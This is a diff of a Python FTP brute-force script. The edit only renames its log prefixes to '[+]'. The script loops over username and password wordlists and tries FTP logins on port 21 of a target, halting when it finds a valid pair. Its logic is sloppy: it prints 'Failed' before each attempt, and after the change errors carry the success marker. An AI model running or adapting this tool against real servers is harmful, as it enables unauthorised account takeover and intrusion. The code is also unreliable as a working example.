@@ -6,7 +6,7 @@ def ftp(target, username, password):
         ftp = FTP()
         ftp.connect(target, 21)
         ftp.login(username, password)
-        print(f"[BruteFTP] {target}:21      - {target}:21 - Success: '{username}:{password}'")
+        print(f"[+] {target}:21      - {target}:21 - Success: '{username}:{password}'")
         input()
         ftp.quit()
         sys.exit(0)
@@ -19,10 +19,10 @@ def bruteforce(target, userlist, wordlist):
             username = username.strip()
             for password in open(wordlist, "r"):
                 password = password.strip()
-                print(f"[BruteFTP] {target}:21      - {target}:21 - Failed: '{username}:{password}'")
+                print(f"[+] {target}:21      - {target}:21 - Failed: '{username}:{password}'")
                 ftp(target, username, password)
     except FileNotFoundError as e:
-        print(f"[BruteFTP] {target}:21      - {target}:21 - Error: '{e}'")
+        print(f"[+] {target}:21      - {target}:21 - Error: '{e}'")
 
 
 if __name__ == "__main__":
@@ -32,4 +32,5 @@ if __name__ == "__main__":
     print(f"[*] Running for {target}:21")
     bruteforce(target, userlist, wordlist)
 
-    print(f"[-] [BruteDuck] {target}:21      - {target}:21 - PASS Error")
+    print(f"[-] [+] {target}:21      - {target}:21 - PASS Error")
+
